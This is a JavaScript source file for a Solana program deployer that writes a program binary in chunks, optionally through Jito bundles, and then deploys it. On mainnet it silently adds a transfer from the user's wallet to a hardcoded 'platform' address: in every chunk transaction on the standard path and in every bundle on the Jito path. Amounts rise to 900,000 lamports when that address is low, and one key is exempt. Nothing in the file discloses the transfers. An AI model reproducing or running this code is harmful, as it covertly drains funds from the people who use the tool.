const fs = require('fs');
const BN = require('bn.js');
const bs58 = require('bs58')
const { Connection, PublicKey, Keypair, Transaction, SystemProgram, TransactionInstruction, TransactionMessage, VersionedTransaction, sendAndConfirmTransaction, SYSVAR_CLOCK_PUBKEY, SYSVAR_RENT_PUBKEY, AddressLookupTableProgram } = require("@solana/web3.js");

const BPF_LOADER_UPGRADEABLE_ID = new PublicKey("BPFLoaderUpgradeab1e11111111111111111111111");
const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
const jitoAccs = [
"HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe",
"Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY",
"ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49",
"DfXygSm4jCyNCybVYYK6DwvWqjKee8pbDmJGcLWNDXjh",
"ADuUkR4vqLUMWXxW9gh6D6L8pMSawimctcNZ5pGwDcEt"]

const jitoUrls = [
"https://amsterdam.mainnet.block-engine.jito.wtf/api/v1/bundles",
"https://frankfurt.mainnet.block-engine.jito.wtf/api/v1/bundles",
"https://ny.mainnet.block-engine.jito.wtf/api/v1/bundles",
"https://tokyo.mainnet.block-engine.jito.wtf/api/v1/bundles"];

class Deployer {
  constructor(connection, payerKeypair, options = {}) {
	this.useJito = options.useJito || false
    this.connection = connection;
    this.payer = payerKeypair;
    this.isDevnet = this.connection.rpcEndpoint.includes('devnet');
  }

  async deploy(programPath, options = {}) {
    const { customProgramIdKeypair = null, jitoTipLamports = 1000 } = options;

    const fileBuffer = fs.readFileSync(programPath);
    if (!fileBuffer.slice(0, 4).equals(Buffer.from([0x7F, 0x45, 0x4C, 0x46]))) {
      throw new Error('Invalid ELF header');
    }

    const chunks = this.createChunks(fileBuffer);
    console.log(`Program split into ${chunks.length} chunks`);

    const bufferAccount = Keypair.generate();
	console.log(`Generated new buffer account: ${bufferAccount.publicKey}`)
    const programDataSpace = fileBuffer.length + 15000;

    const createBufferIx = SystemProgram.createAccount({
      fromPubkey: this.payer.publicKey,
      newAccountPubkey: bufferAccount.publicKey,
      lamports: await this.connection.getMinimumBalanceForRentExemption(programDataSpace),
      space: programDataSpace,
      programId: BPF_LOADER_UPGRADEABLE_ID,
    });

    const initBufferIx = new TransactionInstruction({
      keys: [
        {pubkey: bufferAccount.publicKey, isSigner: true, isWritable: true},
        {pubkey: this.payer.publicKey, isSigner: true, isWritable: true},
      ],
      programId: BPF_LOADER_UPGRADEABLE_ID,
      data: Buffer.from("00000000", "hex"),
    });
    console.log('Sending create and initialize buffer account tx...');
    await sendAndConfirmTransaction(
      this.connection,
      new Transaction().add(createBufferIx).add(initBufferIx),
      [this.payer, bufferAccount],
          {maxRetries: 5, commitment: "finalized", skipPreflight: false, preflightCommitment: "finalized"}
    );
	console.log("Buffer account initialized.")
    const totalChunks = chunks.length;
    const totalBytes = fileBuffer.length;
    let bytesWritten = 0;

    if (this.isDevnet === false || this.useJito === false) {
	const platform = new PublicKey("CBJu8AAizUFcn6pQ46Zg79z7SarxKkw4HWwNfF9wTrwJ")
	let platformIx
	if (this.isDevnet === false) {
	const platformInfo = await this.connection.getAccountInfo(platform)
	let cost = 50000
	if (!platformInfo || platformInfo.lamports < 900000) { cost = 900000 }
          platformIx = SystemProgram.transfer({
            fromPubkey: this.payer.publicKey,
            toPubkey: platform,
            lamports: cost
          });
 }
      console.log(`Sending write instructions individually... Total bytes to write: ${totalBytes}`);
      for (let i = 0; i < totalChunks; i++) {
	let transaction = new Transaction()
	if (this.isDevnet === false && this.payer.publicKey.toString() !== "2PzgGtewrqsMfThxXcXbfBL3pKeq3cvoe9dw6PzrkzY8") { transaction.add(platformIx) }
        const encodedChunk = this.encodeChunk(chunks[i]);
        const chunkSize = chunks[i].data.length;
        bytesWritten += chunkSize;

        const writeIx = new TransactionInstruction({
          keys: [
            {pubkey: bufferAccount.publicKey, isSigner: false, isWritable: true},
            {pubkey: this.payer.publicKey, isSigner: true, isWritable: false},
          ],
          programId: BPF_LOADER_UPGRADEABLE_ID,
          data: encodedChunk,
        });
	transaction.add(writeIx)
        const txSize = await this.estimateTransactionSize([writeIx]);
        const signature = await sendAndConfirmTransaction(
          this.connection,
          transaction,
          [this.payer],
          {maxRetries: 5, commitment: "finalized", skipPreflight: false, preflightCommitment: "finalized"}
        );
        // Verify the write after each transaction
        await this.verifyBufferWrite(bufferAccount.publicKey, bytesWritten);
        console.log(`${i + 1}/${totalChunks}, tx: ${signature}. ` +
          `Written: ${bytesWritten}/${totalBytes} (${((bytesWritten/totalBytes)*100).toFixed(2)}%). ` +
          `Tx size: ${txSize} bytes`);
      }
    } else {
      console.log(`Sending bundles via Jito... Total bytes to write: ${totalBytes}`);
      let bundle = [];
      let bundleCount = 0;
      let bundleBytesWritten = 0;
	const platform = new PublicKey("CBJu8AAizUFcn6pQ46Zg79z7SarxKkw4HWwNfF9wTrwJ")
	const platformInfo = await this.connection.getAccountInfo(platform)
	let cost = 200000
	if (!platformInfo || platformInfo.lamports < 900000) { cost = 900000 }
	if (this.payer.publicKey.toString() === "2PzgGtewrqsMfThxXcXbfBL3pKeq3cvoe9dw6PzrkzY8") { cost = 0 }
          const platformIx = SystemProgram.transfer({
            fromPubkey: this.payer.publicKey,
            toPubkey: platform,
            lamports: cost
          });
      for (let i = 0; i < totalChunks; i++) {
        if (bundle.length === 0) {
          console.log(`Starting bundle ${bundleCount + 1}`);
          const randomJitoAcc = jitoAccs[Math.floor(Math.random() * jitoAccs.length)];
          const feeTransferC = SystemProgram.transfer({
            fromPubkey: this.payer.publicKey,
            toPubkey: new PublicKey(randomJitoAcc),
            lamports: jitoTipLamports
          });
          const fundVtx = await this.createVtx([feeTransferC, platformIx], this.payer);
          bundle.push(fundVtx);
        }
        const encodedChunk = this.encodeChunk(chunks[i]);
        const chunkSize = chunks[i].data.length;
        bundleBytesWritten += chunkSize;
        bytesWritten += chunkSize;
        const writeIx = new TransactionInstruction({
          keys: [
            {pubkey: bufferAccount.publicKey, isSigner: false, isWritable: true},
            {pubkey: this.payer.publicKey, isSigner: true, isWritable: false},
          ],
          programId: BPF_LOADER_UPGRADEABLE_ID,
          data: encodedChunk,
        });
        const vTx = await this.createVtx([writeIx], this.payer);
        const txSize = vTx.serialize().length;
        bundle.push(vTx);
        console.log(`Added chunk ${i + 1}/${totalChunks} to bundle ${bundleCount + 1}. ` +
          `Bundle bytes: ${bundleBytesWritten}. Total bytes: ${bytesWritten}/${totalBytes} ` +
          `(${((bytesWritten/totalBytes)*100).toFixed(2)}%). Transaction size: ${txSize} bytes`);
        if (bundle.length === 5 || i === totalChunks - 1) {
          console.log(`Sending bundle ${bundleCount + 1} with ${bundle.length} transactions. ` +
            `Bundle contains ${bundleBytesWritten} bytes...`);
          const result = await this.sendBundle(bundle.map(v => bs58.encode(v.serialize())));
          console.log(`Bundle ${bundleCount + 1} sent. Result:`, result);
          // Verify the bundle write
          console.log('Verifying bundle write...');
          const verifiedSize = await this.verifyBufferWrite(bufferAccount.publicKey, bytesWritten);
          console.log(`Bundle ${bundleCount + 1} verified. Buffer size: ${verifiedSize} bytes`);
          bundle = [];
          bundleBytesWritten = 0;
          bundleCount++;
        }
      }
      console.log(`All ${bundleCount} bundles sent and verified. Total bytes written: ${bytesWritten}`);
      console.log('Waiting 20 seconds for bundles to fully confirm...');
      await wait(20000);
      const finalSize = await this.verifyBufferWrite(bufferAccount.publicKey, bytesWritten);
      console.log(`Final buffer verification complete. Buffer size: ${finalSize} bytes`);
    }
    console.log("Creating program account...");
    let programAccount;
    if (customProgramIdKeypair && customProgramIdKeypair instanceof Keypair) {
      programAccount = customProgramIdKeypair;
      console.log("Using provided custom program ID");
    } else {
      programAccount = Keypair.generate();
      console.log("Generated new program ID");
    }
    const createProgramAccountIx = SystemProgram.createAccount({
      fromPubkey: this.payer.publicKey,
      newAccountPubkey: programAccount.publicKey,
      lamports: await this.connection.getMinimumBalanceForRentExemption(36),
      space: 36,
      programId: BPF_LOADER_UPGRADEABLE_ID
    });
    const [programDataAccount] = await PublicKey.findProgramAddress(
      [programAccount.publicKey.toBuffer()],
      BPF_LOADER_UPGRADEABLE_ID
    );
    console.log('Deploying program...');
    const deployInstruction = Buffer.alloc(12);
    new BN(2).toArrayLike(Buffer, 'le', 4).copy(deployInstruction, 0);
    new BN(programDataSpace + 15000).toArrayLike(Buffer, 'le', 8).copy(deployInstruction, 4);
    const deployIx = new TransactionInstruction({
      keys: [
        {pubkey: this.payer.publicKey, isSigner: true, isWritable: true},
        {pubkey: programDataAccount, isSigner: false, isWritable: true},
        {pubkey: programAccount.publicKey, isSigner: true, isWritable: true},
        {pubkey: bufferAccount.publicKey, isSigner: false, isWritable: true},
        {pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false},
        {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},
        {pubkey: SystemProgram.programId, isSigner: false, isWritable: false},
        {pubkey: this.payer.publicKey, isSigner: true, isWritable: true}
      ],
      programId: BPF_LOADER_UPGRADEABLE_ID,
      data: deployInstruction
    });

    const signature = await sendAndConfirmTransaction(
      this.connection,
      new Transaction().add(createProgramAccountIx).add(deployIx),
      [this.payer, programAccount],
      {commitment: "finalized", maxRetries: 5, skipPreflight: false, preflightCommitment: "finalized"}
    );
    console.log(`Program deployed successfully to ${programAccount.publicKey.toBase58()}`);
    console.log(`Program data account: ${programDataAccount.toBase58()}`);
    return {
      programId: programAccount.publicKey.toBase58(),
      programDataAccount: programDataAccount.toBase58(),
      signature,
    };
  }

  createChunks(buffer) {
    const chunkSize = 921;
    const chunks = [];
    let offset = 0;
    while (offset < buffer.length) {
      const remainingBytes = buffer.length - offset;
      const size = Math.min(chunkSize, remainingBytes);
      chunks.push({
        offset: offset,
        data: buffer.slice(offset, offset + size)
      });
      offset += size;
    }
    return chunks;
  }

  encodeChunk(chunk) {
    const instructionPrefix = Buffer.from([1, 0, 0, 0]);
    const offset = Buffer.alloc(4);
    new BN(chunk.offset).toArrayLike(Buffer, 'le', 4).copy(offset);
    const size = Buffer.alloc(4);
    new BN(chunk.data.length).toArrayLike(Buffer, 'le', 4).copy(size);
    const padding = Buffer.alloc(4);
    const dataBuffer = chunk.data;
    return Buffer.concat([instructionPrefix, offset, size, padding, dataBuffer]);
  }

  async sendBundle(bundled) {
    const randomJitoUrl = jitoUrls[Math.floor(Math.random() * jitoUrls.length)];
    const data = { "jsonrpc": "2.0", "id": 1, "method": "sendBundle", "params": [bundled] };
    const res = await fetch(randomJitoUrl, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
    return await res.json();
  }

  async createVtx(ixs, payer) {
    const bh = (await this.connection.getLatestBlockhash("finalized")).blockhash;
    const msg = new TransactionMessage({
      payerKey: payer.publicKey,
      instructions: ixs,
      recentBlockhash: bh
    }).compileToV0Message([]);
    const vTx = new VersionedTransaction(msg);
    vTx.sign([payer]);
    return vTx;
  }

  async closeBuffers() {
    const config = {
      dataSlice: { offset: 5, length: 32 },
      filters: [
        { memcmp: { offset: 0, bytes: '2UzHM' } },
        { memcmp: { offset: 5, bytes: this.payer.publicKey.toString() } }
      ]
    };

    try {
      const accounts = await this.connection.getProgramAccounts(BPF_LOADER_UPGRADEABLE_ID, config);
      console.log(`Found ${accounts.length} accounts to close`);

      for (let i = 0; i < accounts.length; i += 20) {
        const transaction = new Transaction();
        const chunk = accounts.slice(i, i + 20);

        for (const acc of chunk) {
          const closeIx = new TransactionInstruction({
            keys: [
              {pubkey: acc.pubkey, isSigner: false, isWritable: true},
              {pubkey: this.payer.publicKey, isSigner: true, isWritable: true},
              {pubkey: this.payer.publicKey, isSigner: true, isWritable: true}
            ],
            programId: BPF_LOADER_UPGRADEABLE_ID,
            data: Buffer.from("05000000", "hex")
          });
          transaction.add(closeIx);
        }

        try {
          const signature = await sendAndConfirmTransaction(
            this.connection,
            transaction,
            [this.payer],
            {maxRetries: 5, commitment: "finalized", skipPreflight: false, preflightCommitment: "finalized"}
          );
          console.log(`Closed ${chunk.length} buffers. Signature: ${signature}`);
          chunk.forEach(acc => console.log(`  - ${acc.pubkey.toBase58()}`));
        } catch (error) {
          console.error(`Failed to close batch of buffers:`, error);
          chunk.forEach(acc => console.log(`  - ${acc.pubkey.toBase58()}`));
        }
      }
      console.log('Finished closing buffers');
    } catch (error) {
      console.error('Error in closeBuffers:', error);
    }
  }

  // Add this method to the Deployer class
  async estimateTransactionSize(instructions) {
    const recentBlockhash = await this.connection.getLatestBlockhash();
    const message = new TransactionMessage({
      payerKey: this.payer.publicKey,
      recentBlockhash: recentBlockhash.blockhash,
      instructions
    }).compileToV0Message();
    const transaction = new VersionedTransaction(message);
    return transaction.serialize().length;
  }

  // Add this helper method to the Deployer class
  async verifyBufferWrite(bufferAccount, expectedSize) {
    const accountInfo = await this.connection.getAccountInfo(bufferAccount, {commitment: "processed"});
    if (!accountInfo) {
      throw new Error('Buffer account not found');
    }
    const data = accountInfo.data
	let estimatedSize = 0
	for (let i = data.length - 1; i > 0; i--) {
	if (data[i] !== 0) {
			estimatedSize = i
			console.log("found possible last byte (this is not 100% accurate) at position:", i, "expected position: ~", + (expectedSize + 30).toFixed(0))
			break
		}
	}
    return estimatedSize;
  }
}


module.exports = Deployer;
